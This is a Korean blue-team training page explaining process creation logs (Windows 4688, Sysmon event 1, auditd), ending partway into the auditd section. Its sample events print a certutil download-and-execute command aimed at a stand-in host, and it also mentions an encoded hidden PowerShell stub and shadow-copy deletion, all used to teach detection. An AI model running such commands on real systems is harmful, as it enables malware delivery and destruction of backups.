---
title: "프로세스 생성 이벤트 — 4688, Sysmon 이벤트 1, auditd와 audit.log, Snoopy"
tags:
  - training
  - blue-team
  - windows
  - linux
  - logging
  - sysmon
  - auditd
---

# 프로세스 생성 이벤트 — 4688, Sysmon 이벤트 1, auditd와 audit.log, Snoopy { #process-creation }

!!! abstract "이 페이지에서 다루는 것"
    엔드포인트 로그 가운데 가장 값진 것, 바로 프로그램이 시작될 때마다 남는 기록입니다. 프로세스 생성 로그가 왜 거의 모든 악성코드와 거의 모든 "있는 도구로 공격하기(living off the land)"를 잡아내는지, 그리고 어떤 칸이 이 로그를 쓸모 있게 만드는지 — **경로**, **명령줄**, **부모 프로세스**, **사용자**, **해시**, **서명자**. Windows에서는 Security 채널의 이벤트 **4688**(켜는 법, 명령줄이 왜 기본으로 *꺼져* 있는지, 실제 이벤트의 모든 칸)과 **Sysmon 이벤트 ID 1**(해시와 부모의 명령줄을 포함해 더 얻는 것, 그리고 *주지 않는* 것). Linux에서는 감사 하위 시스템 **auditd** — 프로세스 생성 규칙을 단어 하나씩 읽고, `audit.log` 기록 하나를 SYSCALL/EXECVE/CWD/PATH/PROCTITLE 줄로 나눠 칸마다 읽고, 16진수로 바뀐 인자, "`sudo` 뒤에 숨은 진짜 사람"을 알려 주는 `auid`, `ausearch`/`aureport` 도구 — 그리고 명령 하나마다 읽기 쉬운 한 줄을 인증 로그에 남기는 가벼운 도구 **Snoopy**, 마지막으로 각 도구를 피하는 방법들. SOC 점검 목록, 2026년 관점, 확인 문제가 이어집니다.

!!! note "표기"
    **[보충]** = 꼭 알아야 할 실무 보충, **[정정]** = 흔히 잘못 알려진 내용 정정, **[변경됨]**/**[주의]** = 최근 바뀐 점과 옛 방식대로 하면 위험한 점. 호스트 이름, 도메인, 계정, IP, 해시, 파일 이름은 모두 설명용 가상 값(`.example`, 문서용·사설 IP)입니다.

## 한눈에 보는 핵심 8가지 { #key-points }

1. 프로세스 생성 로그는 "**무엇이 실행됐나, 누가 실행했나, 어떻게, 무엇이 띄웠나**"에 답합니다. 공격은 거의 언제나 *무언가를* 실행해야 하니, 이 로그는 Windows나 Linux에 원래 있는 도구만 쓰는 공격까지 포함해 거의 모든 침입을 봅니다.
2. 가장 중요한 칸은 **명령줄(command line)** 입니다. `powershell.exe` 자체는 정상입니다. 하지만 Word가 띄운 `powershell.exe -nop -w hidden -enc JABjAD0A...`는 아닙니다. 인자가 없으면 같은 도구를 좋게 쓴 건지 나쁘게 쓴 건지 구분할 수 없습니다.
3. 두 번째로 중요한 칸은 **부모 프로세스(parent process)** 입니다. Office, 브라우저, PDF 리더, 웹 서버가 셸(`cmd.exe`, `powershell.exe`, `/bin/sh`)을 띄우면, 그건 우리가 가진 가장 강한 신호 중 하나입니다.
4. Windows **4688**(Security 채널)은 기본으로 들어 있어서 에이전트가 필요 없습니다. 그런데 **명령줄은 따로 정책을 켜야만 기록됩니다.** 모든 컴퓨터에서 켜져 있는지 꼭 확인하세요.
5. **Sysmon 이벤트 ID 1**(`Microsoft-Windows-Sysmon/Operational`)은 파일 해시, 버전 정보(설명, 제품, 회사, 원래 파일 이름), **부모의 명령줄**, 고유한 `ProcessGuid`, 무결성 수준(integrity level)을 더 줍니다. 로그 안에 해시가 있으니 엔드포인트를 건드리지 않고도 평판 조회를 시작할 수 있습니다.
6. **[정정]** Sysmon 이벤트 1에는 파일의 **서명 상태가 없습니다.** 서명은 다른 Sysmon 이벤트(이미지·드라이버 로드)와 EDR 기록에 나옵니다. 버전 정보 칸은 파일에서 그대로 베껴 온 것이라 공격자가 쉽게 꾸밀 수 있습니다.
7. Linux에서 `execve` 규칙을 건 **auditd**는 모든 프로그램 시작을 기록합니다. 다만 명령 하나가 일련번호로 묶인 **여러 줄**이 되고, 인자가 **16진수로 인코딩**될 수 있으며, `auid` 칸은 `sudo`나 `su`를 써도 **처음 로그인한 사용자**를 그대로 간직합니다.
8. **Snoopy**는 명령 하나마다 읽기 쉬운 한 줄을 syslog(보통 `/var/log/auth.log`)에 씁니다. 하지만 라이브러리를 미리 끼워 넣는(preload) 방식이라, 정적으로 빌드된 프로그램이나 root를 가진 공격자는 피해 갈 수 있습니다. 완벽하지 않다고 쓸모없는 건 아닙니다. 수집하되, 한계를 알고 쓰세요.

## 프로세스 생성 로그가 왜 그렇게 중요한가 { #why }

병원 약제부를 떠올려 보세요. 약이 나갈 때마다 장부에 적습니다. 어떤 약인지, 용량과 복용법은 어떤지, 어느 의사가 처방했는지, 어느 환자에게 가는지, 어느 간호사가 받아 갔는지. 병실을 하나하나 지켜보지 않아도 문제는 눈에 띕니다. "모르핀, 평소의 열 배 용량, 처방한 사람은 청소 담당 직원" 같은 줄은 저절로 튀어나오니까요. 프로세스 생성 로그가 컴퓨터의 바로 그 장부입니다. "약"은 프로그램(**이미지(image)**, 즉 실행 파일 경로), "용량과 복용법"은 **명령줄 인자**, "처방한 의사"는 **부모 프로세스**, "환자"는 그 프로그램이 돌아가는 **사용자 계정**입니다.

기술적인 실제로 돌아오면, 운영체제는 새 프로세스를 만들 때마다 어떤 파일을 불러왔는지, 어떤 인자를 넘겼는지, 어느 프로세스가 요청했는지, 어떤 보안 토큰으로 돌아가는지를 정확히 압니다. 프로세스 생성 로그는 그걸 그냥 적어 두는 것입니다. 이게 중요한 이유는 세 가지입니다.

첫째, **악성코드는 거의 다 실행돼야 합니다.** 대부분 메모리에서만 사는 악성코드도 보통 어떤 프로세스에서 출발합니다. 스크립트 호스트든, 셸이든, 코드를 돌리려고 악용된 서명된 프로그램이든, 그 시작이 여기에 남습니다.

둘째, 공격자는 점점 자기 도구를 들고 오지 않고 이미 깔려 있는 걸 씁니다. 이른바 "있는 도구로 공격하기(living off the land)"입니다. `certutil.exe`로 파일을 내려받고, `rundll32.exe`로 DLL을 돌리고, `mshta.exe`로 스크립트를 실행하고, `wmic.exe`로 원격에서 프로세스를 띄우고, `bash`에서 내려받은 걸 바로 셸로 넘깁니다. 이때 *프로그램*은 모두 정상이고 서명도 되어 있습니다. 악용이라는 걸 보여 주는 건 오직 **인자**와 **부모**뿐입니다. MITRE ATT&CK은 이런 것 상당수를 **T1059**(Command and Scripting Interpreter: `.001` PowerShell, `.003` Windows Command Shell, `.004` Unix Shell)와 **T1218**(System Binary Proxy Execution, 시스템 바이너리를 대리 실행에 악용)로 묶습니다.

셋째, 많이 모이면 이 로그는 **지켜보기만 하는 가벼운 애플리케이션 제어**처럼 쓸 수 있습니다. 전체 컴퓨터의 프로세스 시작을 모아 두었다면, "지금까지 딱 한 대에서만 실행된 실행 파일은?", "이번 주 전에는 한 번도 본 적 없는 해시는?" 같은 질문을 던질 수 있습니다. 노트북 한 대의 `C:\Users\<user>\AppData\Local\Temp\`에 처음 보는 프로그램이 나타나면, 수백만 개의 평범한 기록 사이에서 확 튀어 보입니다. 애플리케이션 제어 우회 방법 상당수([애플리케이션 제어, FIM, 지속성 잡기](../endpoint-defense/appcontrol-fim-persistence.md) 참고)가 믿을 만한 프로그램에 이상한 스크립트나 인자를 주는 방식인데, 바로 그게 이 로그에 남습니다.

### 좋은 프로세스 생성 로그에 들어 있어야 할 것 { #ideal-fields }

| 칸 | 왜 필요한가 |
| --- | --- |
| 시각과 호스트 | 어디서, 언제 — 모든 타임라인의 바탕 |
| 실행 파일 경로와 이름 | `C:\Windows\System32\cmd.exe`와 `C:\ProgramData\cmd.exe`는 이름은 같아도 뜻이 완전히 다름 |
| 명령줄(인자) | 같은 프로그램의 좋은 쓰임과 나쁜 쓰임을 갈라 줌 |
| 부모 프로세스(경로, ID, 되도록 명령줄까지) | "누가 이걸 띄웠나?" — 맥락을 주는 가장 강한 칸 |
| 사용자와 로그온/세션 ID | 어떤 계정으로 돌았나, 어느 로그온에 속하나([로그인 이벤트](logins.md)와 이어짐) |
| 프로세스 ID(그리고 고유 ID) | 같은 프로세스의 네트워크·파일·레지스트리 이벤트와 이어 붙일 수 있음 |
| 해시 | 평판 조회, 전체 컴퓨터 기준 "처음 본 날"과 퍼진 정도 |
| 서명 / 서명자 | 이상한 위치의 서명 없는 프로그램은 볼 가치가 있음(단, 서명됐다고 안전한 건 아님) |
| 무결성 수준 / 권한 상승 | 관리자 전체 권한으로 돌았나? |

이걸 전부 주는 출처는 하나도 없습니다. 흔한 출처는 아래와 같고, 이 페이지는 분석가라면 누구나 만나는 네 가지를 차례로 다룹니다.

| 플랫폼 | 출처 | 비고 |
| --- | --- | --- |
| Windows | Security 이벤트 **4688** | 기본 내장. 명령줄은 별도 설정 필요. 해시 없음 |
| Windows | **Sysmon** 이벤트 1 | 무료 Microsoft 도구(2026년에는 Windows 내장 선택적 기능으로도 제공). 해시, 부모 명령줄, GUID |
| Windows / Linux / macOS | EDR 에이전트 | 보통 가장 풍부함. EDR 콘솔에서 보거나 SIEM으로 보냄 |
| Linux | **auditd** `execve` 규칙 | 커널 감사 시스템에 내장. 아주 자세하고 아주 장황함 |
| Linux | **Snoopy** | 미리 끼워 넣는 라이브러리. 명령마다 syslog에 한 줄 |
| Linux | eBPF 기반 센서(예: Sysmon for Linux, Falco, Tetragon), Auditbeat, Sysdig | 구조화된 출력을 주는 요즘 대안 |

## Windows 이벤트 4688: 새 프로세스가 만들어짐 { #4688 }

### 무엇이고 언제 생기나 { #4688-when }

이벤트 **4688 — "A new process has been created"(새 프로세스가 만들어짐)** 은 고급 감사 정책(Advanced Audit Policy)의 *Detailed Tracking* 아래 **Audit Process Creation** 하위 범주가 **성공(Success)** 으로 켜져 있으면, 프로세스가 시작될 때마다 **Security** 채널에 남습니다. 짝꿍인 **4689 — "A process has exited"(프로세스가 끝남)** 는 프로세스가 끝날 때 남습니다(*Audit Process Termination* 하위 범주). 무언가가 얼마나 오래 돌았는지 알아낼 때 쓸모 있지만, 중요도는 훨씬 낮습니다.

4688의 큰 장점은 따로 설치할 게 없다는 점입니다. 지원되는 모든 Windows 버전에 들어 있고, 대부분의 조직은 이미 Security 채널을 SIEM으로 보내고 있으니, 켜기만 하면 바로 "그냥 되는" 경우가 많습니다. 큰 함정은 **명령줄이 기본으로는 들어가지 않는다**는 것입니다. 그룹 정책 설정 *Administrative Templates → System → Audit Process Creation → **Include command line in process creation events***(레지스트리로는 `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit` 아래 `ProcessCreationIncludeCmdLine_Enabled` = 1)를 따로 켜야 합니다. 이게 없으면 `CommandLine` 칸이 비고, 이 로그 가치의 대부분이 날아갑니다.

공격자 입장에서 4688이 중요한 이유는 **실행(Execution, TA0002)** 이 평문으로 고스란히 남기 때문입니다. 내려받기 명령, 인코딩된 PowerShell, **정보 탐색(Discovery)** 단계의 `whoami /all`과 `net group "domain admins" /domain`(T1033, T1069.002), 랜섬웨어 직전의 `vssadmin delete shadows`(T1490)까지요. 그래서 일부 공격자는 Security 로그를 지우거나(T1070.001, 이벤트 1102) 감사 정책을 건드립니다(T1562.002).

### 이벤트 전체 모습 { #4688-sample }

워크스테이션 `WS-114`의 사용자가 이메일로 온 문서를 엽니다. 잠시 뒤 Word가 명령 셸을 띄우고, 그 셸이 `certutil.exe`로 파일을 내려받습니다. `certutil.exe` 프로세스에 대한 4688입니다(System 부분은 줄였습니다).

```xml
<System>
  <EventID>4688</EventID>
  <TimeCreated SystemTime="2026-11-20T02:14:07.5521846Z" />
  <Channel>Security</Channel>
  <Computer>WS-114.corp.example</Computer>
</System>
<EventData>
  <Data Name="SubjectUserSid">S-1-5-21-1004336348-1177238915-682003330-3108</Data>
  <Data Name="SubjectUserName">j.park</Data>
  <Data Name="SubjectDomainName">CORP</Data>
  <Data Name="SubjectLogonId">0x2b04e11</Data>
  <Data Name="NewProcessId">0x1f3c</Data>
  <Data Name="NewProcessName">C:\Windows\System32\certutil.exe</Data>
  <Data Name="TokenElevationType">%%1938</Data>
  <Data Name="ProcessId">0x1e88</Data>
  <Data Name="CommandLine">certutil.exe -urlcache -split -f http://files.example/inv.txt C:\Users\Public\inv.exe</Data>
  <Data Name="TargetUserSid">S-1-0-0</Data>
  <Data Name="TargetUserName">-</Data>
  <Data Name="TargetDomainName">-</Data>
  <Data Name="TargetLogonId">0x0</Data>
  <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
  <Data Name="MandatoryLabel">S-1-16-8192</Data>
</EventData>
```

### 칸 하나씩 { #4688-fields }

- `SubjectUserSid` / `SubjectUserName` / `SubjectDomainName` — 새 프로세스가 돌아가는 계정입니다. `CORP\j.park`, 평범한 도메인 사용자입니다.
- `SubjectLogonId` — `0x2b04e11`, 이 프로세스가 속한 로그온 세션입니다. `WS-114`의 4624에서 같은 값을 찾으면 이 사용자가 *어떻게* 로그온했는지(콘솔, RDP, 네트워크) 알 수 있습니다. [로그온 ID](logins.md#logon-id)를 참고하세요.
- `NewProcessId` — 새 프로세스의 ID, 16진수입니다(`0x1f3c` = 7996). 프로세스 ID는 재사용되니 늘 호스트, 시각과 함께 보세요.
- `NewProcessName` — 실행 파일의 전체 경로. `System32`에 있는 `certutil.exe`는 진짜 Windows 인증서 도구입니다. 같은 이름이 `C:\Users\Public\`에 있다면 가짜입니다.
- `TokenElevationType` — UAC 토큰 종류. `%%1936` = 유형 1(전체 토큰: UAC가 꺼졌거나, 기본 제공 Administrator이거나, 서비스), `%%1937` = 유형 2(**권한 상승됨** — "관리자 권한으로 실행"을 승인함), `%%1938` = 유형 3(**제한됨**, 권한을 올리지 않은 평소 토큰). 여기서는 제한된 토큰이니, 공격자는 이 세션에서 아직 관리자 권한이 없습니다.
- `ProcessId` — **부모의** 프로세스 ID(`0x1e88`)입니다. 이름이 헷갈립니다. 4688에서 `ProcessId`는 새 프로세스가 아니라 *만든 쪽*입니다.
- `CommandLine` — 이야기 전부가 여기 있습니다. `-urlcache -split -f`는 `certutil`이 URL을 받아 파일로 저장하게 만듭니다. 여기서는 "텍스트" 파일을 아무나 쓸 수 있는 폴더에 `inv.exe`로 저장합니다. 서명된 Windows 프로그램을 통한 **도구 반입(Ingress Tool Transfer, T1105)** 입니다.
- `TargetUserSid` / `TargetUserName` / `TargetLogonId` — 새 프로세스가 만든 쪽과 *다른* 계정으로 돌 때만 채워집니다(예: `runas`). `S-1-0-0`/`-`/`0x0`이면 "Subject와 같은 계정"이라는 뜻입니다.
- `ParentProcessName` — 만든 쪽의 경로, `cmd.exe`입니다. 4688은 부모의 **이름은 주지만 명령줄은 주지 않는다**는 점을 기억하세요. `cmd.exe`를 무엇이 띄웠는지 보려면 그 이전 4688, 즉 `NewProcessId`가 `0x1e88`인 이벤트를 찾아야 합니다.
- `MandatoryLabel` — 무결성 수준 SID. `S-1-16-4096` 낮음(low), `S-1-16-8192` **보통(medium, 일반 사용자)**, `S-1-16-12288` 높음(high, 권한 올린 관리자), `S-1-16-16384` 시스템.

사슬을 거꾸로 따라가면, 같은 호스트의 이전 4688은 `NewProcessId` `0x1e88`, `NewProcessName` `C:\Windows\System32\cmd.exe`, `CommandLine` `cmd.exe /c certutil.exe -urlcache ... && C:\Users\Public\inv.exe`, `ParentProcessName` `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE`일 것입니다. **Word → cmd → certutil**, 이게 악성 문서의 전형적인 모양입니다(T1204.002, User Execution: Malicious File).

### PowerShell로 찾아보기 { #4688-query }

컴퓨터 한 대에서, 또는 내보낸 `.evtx` 파일에서 `Get-WinEvent`로 4688을 뽑을 수 있습니다.

```powershell
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4688; StartTime = (Get-Date).AddHours(-2) } |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $d = @{}; $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]@{ Time = $_.TimeCreated; Parent = $d.ParentProcessName; New = $d.NewProcessName; Cmd = $d.CommandLine }
  } |
  Where-Object { $_.Parent -match '\\(winword|excel|powerpnt|outlook)\.exe$' }
```

- 1번 줄 — `Get-WinEvent`가 이벤트를 읽습니다. `-FilterHashtable`은 이벤트 로그 서비스 안에서 걸러 주니 빠릅니다. `Security` 로그, ID `4688`, 최근 두 시간만.
- 2번 줄 — `ForEach-Object`로 이벤트를 하나씩 처리합니다.
- 3번 줄 — 이벤트를 XML로 바꿔서, 메시지 문장 대신 이름 붙은 칸을 읽을 수 있게 합니다.
- 4번 줄 — `Data Name`(예: `CommandLine`)과 그 값을 짝지은 작은 사전 `$d`를 만듭니다.
- 5번 줄 — 시각, 부모, 새 프로세스, 명령줄만 담은 깔끔한 객체를 내보냅니다.
- 7번 줄 — 부모가 Office 프로그램인 것만 남깁니다.

출력은 보통 이렇게 생겼습니다.

```text
Time                 Parent                                                   New                                 Cmd
----                 ------                                                   ---                                 ---
20/11/2026 1:14:06 PM C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE C:\Windows\System32\cmd.exe cmd.exe /c certutil.exe -urlcache -split -f http://files.example/inv.txt ...
```

(시각은 분석가 컴퓨터의 현지 시간대로 나옵니다. 여기서는 UTC 02:14가 현지 13:14로 보입니다.) SIEM에서는 같은 논리를 정규화된 칸 `parent_process`, `process`, `command_line`을 대상으로 한 검색으로 씁니다.

## Sysmon 이벤트 ID 1: 더 자세한 프로세스 생성 { #sysmon-1 }

### Sysmon이 뭔가 { #sysmon-what }

**Sysmon(System Monitor)** 은 드라이버와 서비스로 이루어진 무료 Microsoft 도구입니다. 설정 파일과 함께 설치하면 자기만의 채널 **`Microsoft-Windows-Sysmon/Operational`** 에 자세한 이벤트를 씁니다. **이벤트 ID 1**이 프로세스 생성이고, 다른 ID는 네트워크 연결(3), 이미지 로드(7), LSASS 메모리 읽기 같은 프로세스 접근(10), 파일 생성(11), 레지스트리 변경(12–14), DNS 질의(22) 등을 다룹니다. 4688보다 손이 더 갑니다. 프로그램을 배포해야 하고, 무엇을 기록하고 무엇을 버릴지 정하는 XML 설정을 관리해야 하고, 채널을 하나 더 수집해야 합니다. 대신 훨씬 풍부한 데이터를 주고, 한 번 배포로 여러 이벤트 종류를 얻습니다.

### 이벤트 전체 모습 { #sysmon-1-sample }

같은 `certutil.exe` 실행을 Sysmon은 이렇게 기록합니다.

```xml
<System>
  <Provider Name="Microsoft-Windows-Sysmon" />
  <EventID>1</EventID>
  <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
  <Computer>WS-114.corp.example</Computer>
</System>
<EventData>
  <Data Name="RuleName">technique_id=T1105,technique_name=Ingress Tool Transfer</Data>
  <Data Name="UtcTime">2026-11-20 02:14:07.552</Data>
  <Data Name="ProcessGuid">{6b1d2c4e-8a3f-673d-2c05-000000002f00}</Data>
  <Data Name="ProcessId">7996</Data>
  <Data Name="Image">C:\Windows\System32\certutil.exe</Data>
  <Data Name="FileVersion">10.0.26100.1 (WinBuild.160101.0800)</Data>
  <Data Name="Description">CertUtil.exe</Data>
  <Data Name="Product">Microsoft® Windows® Operating System</Data>
  <Data Name="Company">Microsoft Corporation</Data>
  <Data Name="OriginalFileName">CertUtil.exe</Data>
  <Data Name="CommandLine">certutil.exe -urlcache -split -f http://files.example/inv.txt C:\Users\Public\inv.exe</Data>
  <Data Name="CurrentDirectory">C:\Users\j.park\Documents\</Data>
  <Data Name="User">CORP\j.park</Data>
  <Data Name="LogonGuid">{6b1d2c4e-7f10-673d-114e-b00200000000}</Data>
  <Data Name="LogonId">0x2b04e11</Data>
  <Data Name="TerminalSessionId">1</Data>
  <Data Name="IntegrityLevel">Medium</Data>
  <Data Name="Hashes">SHA256=3F9A0C7E5B21D4486E0A9C1F7B3D52E8A6C04F91D7B2E35A8C6F0D1B4E7A9C23,IMPHASH=0D4A8E2C7F1B93A65E0C2D8F4B1A7E36</Data>
  <Data Name="ParentProcessGuid">{6b1d2c4e-8a3e-673d-2b05-000000002f00}</Data>
  <Data Name="ParentProcessId">7816</Data>
  <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
  <Data Name="ParentCommandLine">cmd.exe /c certutil.exe -urlcache -split -f http://files.example/inv.txt C:\Users\Public\inv.exe &amp;&amp; C:\Users\Public\inv.exe</Data>
  <Data Name="ParentUser">CORP\j.park</Data>
</EventData>
```

### Sysmon이 더 주는 것, 칸 하나씩 { #sysmon-1-fields }

핵심은 4688과 같습니다. `Image`(새 프로세스 경로), `CommandLine`, `User`, `LogonId`, `ParentImage`. 가치는 덤으로 붙은 칸에 있습니다.

- `RuleName` — 걸린 Sysmon 설정 규칙의 이름표입니다. 커뮤니티 설정들은 규칙에 ATT&CK ID를 붙여 두기 때문에, 이벤트가 들어올 때부터 "이건 이것일 수 있다"는 힌트를 달고 옵니다.
- `UtcTime` — 언제나 UTC라서 여러 호스트의 타임라인을 맞추기 쉽습니다.
- `ProcessGuid` / `ParentProcessGuid` — **이 프로세스만의 고유 ID**입니다. PID와 달리 재사용되지 않습니다. 이 프로세스에서 나온 다른 모든 Sysmon 이벤트(네트워크 연결, 쓴 파일, 레지스트리 변경)가 같은 GUID를 달고 있어서 확실하게 이어 붙일 수 있습니다.
- `FileVersion`, `Description`, `Product`, `Company`, `OriginalFileName` — PE 파일에서 읽어 온 버전 정보입니다. 특히 `OriginalFileName`이 쓸모 있습니다. 누군가 이름 기반 규칙을 피하려고 `certutil.exe`를 `C:\ProgramData\update.exe`로 복사하면 `Image`는 바뀌지만 `OriginalFileName`은 여전히 `CertUtil.exe`라고 말해 줍니다(T1036.003, Rename System Utilities 탐지). **[주의]** 공격자는 *자기가 만든* 악성코드의 버전 정보에 아무 글이나 써 넣을 수 있습니다. 증거가 아니라 힌트로만 보세요.
- `CurrentDirectory` — 프로세스가 시작된 작업 폴더. 웹 루트나 임시 폴더에서 시작된 셸은 단서가 됩니다.
- `IntegrityLevel` — `Low`, `Medium`, `High`, `System`을 글자로 보여 줍니다.
- `Hashes` — 설정에서 고른 해시(`MD5`, `SHA1`, `SHA256`, `IMPHASH`). 이게 가장 큰 이득입니다. 이벤트가 SIEM에 들어오자마자, 엔드포인트에 로그온하거나 파일을 복사하지 않고도 위협 인텔리전스와 우리 전체 컴퓨터("이걸 실행한 컴퓨터가 몇 대지?")에 해시를 맞춰 볼 수 있습니다. `IMPHASH`(가져오는 함수 목록의 해시)는 같은 악성코드 계열의 변종을 묶는 데 도움이 됩니다.
- `ParentCommandLine` — 부모의 전체 명령줄입니다. 그래서 이벤트 하나로 두 세대를 봅니다. `cmd.exe /c ... && C:\Users\Public\inv.exe` — 공격자가 내려받은 파일을 바로 *실행*하려 했다는 게 보입니다.
- `ParentUser` — 부모가 돌던 계정(새 Sysmon 버전에서 추가). `SYSTEM`으로 도는 부모가 일반 사용자 자식을 띄우거나 그 반대라면 눈여겨볼 만합니다.

**[정정]** Sysmon 이벤트 1은 실행 파일이 서명됐는지 **알려 주지 않습니다.** 서명 정보(`Signed`, `Signature`, `SignatureStatus`)는 Sysmon **이벤트 6**(드라이버 로드)과 **이벤트 7**(이미지 로드)에 나오고, 대부분의 EDR은 모든 프로세스의 서명자를 기록합니다. Sysmon에서 프로세스 이미지의 서명자가 필요하면, 그 `ProcessGuid`가 자기 이미지를 불러온 이벤트 7을 보거나, 서명 확인 도구로 파일을 직접 확인하세요.

### 4688이냐 Sysmon이냐 { #4688-vs-sysmon }

| | 4688 | Sysmon 이벤트 1 |
| --- | --- | --- |
| 설치 | 필요 없음(정책만) | 드라이버 + 서비스 + 설정(또는 2026년 내장 선택적 기능) |
| 명령줄 | 별도 정책을 켜야 | 항상 |
| 부모 | 이름과 PID만 | 경로, PID, GUID, **명령줄**, 사용자 |
| 해시 | 없음 | 있음(설정 가능) |
| 버전 정보 | 없음 | 있음(`OriginalFileName` 등) |
| 고유 프로세스 ID | 없음(PID 재사용) | `ProcessGuid` |
| 다른 이벤트 종류 | 다른 Security 이벤트 | 네트워크, 파일, 레지스트리, DNS, 프로세스 접근… |
| 양 조절 | 켜거나 끄거나 | 설정의 포함/제외 규칙 |

배포할 수 있다면 자세함으로는 Sysmon이 낫고, 많은 팀이 **둘 다** 씁니다. 4688은 에이전트에 기대지 않는 안전망입니다. Sysmon은 EDR이 기록하는 것을 상당 부분 기록해서 "가난한 사람의 EDR"이라고도 부르지만, **대응**은 못 합니다. 호스트를 격리하거나, 프로세스를 죽이거나, 파일을 가져오지 못합니다. 이미 EDR이 있다면 그 프로세스 기록(예: Microsoft Defender for Endpoint의 `DeviceProcessEvents`)이 있어서 Sysmon은 선택 사항이 되는 경우가 많습니다. [PAW, EDR, DLP, UEBA](../endpoint-defense/paw-edr-dlp-ueba.md)를 참고하세요.

## auditd로 보는 Linux 프로세스 생성 { #auditd }

### auditd가 뭔가 { #auditd-what }

Linux 커널에는 **감사 하위 시스템(audit subsystem)** 이 들어 있고, 사용자 공간 데몬 **`auditd`** 가 그 기록을 **`/var/log/audit/audit.log`** 에 씁니다. 거의 무엇이든 지켜볼 수 있습니다. 특정 파일 읽기·쓰기, 모든 시스템 콜, 프로그램 실행, 로그인, 사용자 계정 변경, 네트워크 관련 호출 — 그리고 각각을 어떤 사용자가 했는지도 남깁니다. 무엇도 **막지는 않고** 기록만 합니다. 규칙은 **`auditctl`** 로 넣거나(바로 적용되지만 재부팅하면 사라짐), **`/etc/audit/rules.d/`** 안의 파일에 씁니다(부팅할 때 `augenrules`가 불러옴). 기록은 **`ausearch`** 로 찾고 **`aureport`** 로 요약합니다.

법정 속기사를 떠올리면 딱 맞습니다. auditd는 모든 말을 정해진, 아주 딱딱한 약식 기호로 받아 적습니다. 빠지는 건 없지만, 그 기록을 읽으려면 연습이 필요합니다.

### 프로세스 생성 규칙, 단어 하나씩 { #auditd-rule }

Linux에서 새 프로그램은 **`execve`** 시스템 콜로 시작됩니다(프로세스가 먼저 `fork`/`clone`으로 자기를 복사하고, 그 복사본이 `execve`를 불러 새 프로그램으로 바뀝니다). 그러니 "모든 프로세스 생성을 기록하라"는 곧 "모든 `execve`를 기록하라"입니다.

```bash
sudo auditctl -a always,exit -F arch=b64 -S execve -k proc_create
sudo auditctl -a always,exit -F arch=b32 -S execve -k proc_create
```

- `auditctl` — 커널의 감사 규칙을 바꾸는 도구.
- `-a always,exit` — `exit` 목록(시스템 콜이 *돌아올 때* 검사하므로 결과를 알 수 있음)에 동작 `always`(언제나 기록)인 규칙을 **덧붙입니다(append)**.
- `-F arch=b64` — **칸(field)** 필터. 64비트 시스템 콜 표만 봅니다. 시스템 콜 번호는 32비트와 64비트가 다르기 때문에 `arch=b32` 규칙이 하나 더 필요합니다. 없으면 공격자가 32비트 프로그램을 돌려 64비트 규칙을 피할 수 있습니다.
- `-S execve` — 지켜볼 시스템 콜. **[보충]** 요즘 규칙 모음은 열린 파일 핸들에서 프로그램을 시작하는 변형 `-S execveat`도 함께 넣습니다.
- `-k proc_create` — **키(key)**. 기록마다 저장되는 자유로운 이름표라서, 나중에 이 규칙의 기록만 찾을 수 있습니다(`ausearch -k proc_create`).

재부팅 뒤에도 규칙을 유지하려면 같은 줄을(`sudo auditctl` 빼고) `/etc/audit/rules.d/50-exec.rules` 같은 파일에 넣고 `sudo augenrules --load`를 실행합니다. 지금 적용 중인 규칙은 `sudo auditctl -l`로 봅니다.

### 명령 하나, 여섯 줄: audit.log 읽기 { #auditd-record }

위 규칙이 켜진 상태에서, 서버 `app-02`의 사용자가 `/var/log`에 있으면서 `whoami`를 칩니다. auditd는 이렇게 씁니다.

```text
type=SYSCALL msg=audit(1795140847.866:8332): arch=c000003e syscall=59 success=yes exit=0 a0=55c8f62466e0 a1=55c8f61beaf0 a2=55c8f6225430 a3=4040 items=2 ppid=54636 pid=54831 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=2 comm="whoami" exe="/usr/bin/whoami" key="proc_create"
type=EXECVE msg=audit(1795140847.866:8332): argc=1 a0="whoami"
type=CWD msg=audit(1795140847.866:8332): cwd="/var/log"
type=PATH msg=audit(1795140847.866:8332): item=0 name="/usr/bin/whoami" inode=1049945 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
type=PATH msg=audit(1795140847.866:8332): item=1 name="/lib64/ld-linux-x86-64.so.2" inode=1447302 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
type=PROCTITLE msg=audit(1795140847.866:8332): proctitle="whoami"
```

가장 먼저 봐야 할 것은 **여섯 줄 모두가 이벤트 하나**라는 점입니다. `msg=audit(1795140847.866:8332)`가 이 줄들을 묶어 줍니다. 콜론 앞은 유닉스 에포크 초와 밀리초로 된 시각(1795140847.866 = 2026년 11월 20일 02:14:07.866 UTC)이고, `8332`는 **이벤트 일련번호**입니다. 시각과 일련번호가 같은 줄들이 한 이벤트입니다. SIEM이 이걸 이어 붙이지 않으면 반쪽짜리 이벤트 여섯 개를 보게 됩니다.

**SYSCALL 줄 — 누가 무엇을 했나:**

- `type=SYSCALL` — 시스템 콜 자체의 기록.
- `arch=c000003e` — 감사 시스템의 CPU 아키텍처 코드. `c000003e` = x86_64.
- `syscall=59` — 시스템 콜 59번, x86_64에서 `execve`입니다(`ausearch -i`가 이름으로 바꿔 줍니다).
- `success=yes exit=0` — 호출이 성공했습니다. 실패한 `execve`(`success=no exit=-13`, 권한 거부)도 흥미로울 수 있습니다. 누군가 허락되지 않은 걸 실행하려 했다는 뜻이니까요.
- `a0`–`a3` — 시스템 콜에 넘긴 처음 네 개의 날것 인자, 메모리 주소입니다. 분석가에게는 쓸모없고, 진짜 인자는 EXECVE 줄에 있습니다.
- `items=2` — 뒤에 오는 PATH 줄 개수.
